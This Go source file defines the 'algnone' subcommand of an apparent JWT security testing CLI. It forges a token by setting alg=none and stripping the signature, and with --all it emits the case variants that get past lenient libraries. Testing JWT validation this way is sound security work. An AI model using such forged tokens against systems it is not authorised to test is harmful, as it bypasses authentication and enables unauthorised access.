package cmd

import (
	"fmt"

	"github.com/cerberauth/jwtop/jwt/exploit"
	"github.com/cerberauth/x/telemetryx"
	"github.com/spf13/cobra"
	"go.opentelemetry.io/otel/attribute"
	"go.opentelemetry.io/otel/metric"
)

var exploitAlgNoneAll bool

var exploitAlgNoneCmd = &cobra.Command{
	Use:   "algnone <token>",
	Short: "Set alg=none and strip the signature",
	Long: `Produce a copy of the token with alg=none and an empty signature.

With --all, one token is printed for each capitalisation variant
("none", "NONE", "None", "nOnE") to cover libraries that accept
the "none" algorithm case-insensitively.`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		telemetryMeter := telemetryx.GetMeterProvider().Meter(exploitOtelName)
		successCounter, _ := telemetryMeter.Int64Counter("exploit.algnone.success.counter")
		errorCounter, _ := telemetryMeter.Int64Counter("exploit.algnone.error.counter")
		ctx := cmd.Context()

		if exploitAlgNoneAll {
			tokens, err := exploit.AlgNoneAll(args[0])
			if err != nil {
				errorCounter.Add(ctx, 1, metric.WithAttributes(attribute.String("error_reason", "algnone all failed")))
				return fmt.Errorf("algnone: %w", err)
			}
			for _, t := range tokens {
				fmt.Println(t)
			}
			successCounter.Add(ctx, 1)
			return nil
		}

		token, err := exploit.AlgNone(args[0])
		if err != nil {
			errorCounter.Add(ctx, 1, metric.WithAttributes(attribute.String("error_reason", "algnone failed")))
			return fmt.Errorf("algnone: %w", err)
		}
		successCounter.Add(ctx, 1)
		fmt.Println(token)
		return nil
	},
}

func init() {
	exploitAlgNoneCmd.Flags().BoolVar(&exploitAlgNoneAll, "all", false, "Print one token per capitalisation variant of \"none\"")
	exploitCmd.AddCommand(exploitAlgNoneCmd)
}
